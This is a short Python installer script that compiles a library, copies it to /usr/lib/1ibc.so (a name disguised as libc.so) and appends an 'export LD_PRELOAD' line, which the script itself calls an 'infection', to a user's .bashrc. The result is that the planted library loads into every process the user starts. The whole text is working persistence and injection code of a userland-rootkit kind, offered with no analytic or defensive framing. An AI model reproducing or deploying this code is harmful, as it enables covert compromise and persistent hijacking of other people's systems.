#!/bin/python 

import os 

infection = "export LD_PRELOAD=/usr/lib/1ibc.so\n"
print("Compiling library....")
os.system("./compile.sh")
print("Library compiled.")

os.system("cp libc.so /usr/lib/1ibc.so")

with open("/home/satoshi/.bashrc", "r+") as f: 
    data = f.readlines()
    if infection in data:
        print("Infection line detected")
        pass
    else: 
        print("No infection line deteced - inserting")
        f.write(infection)
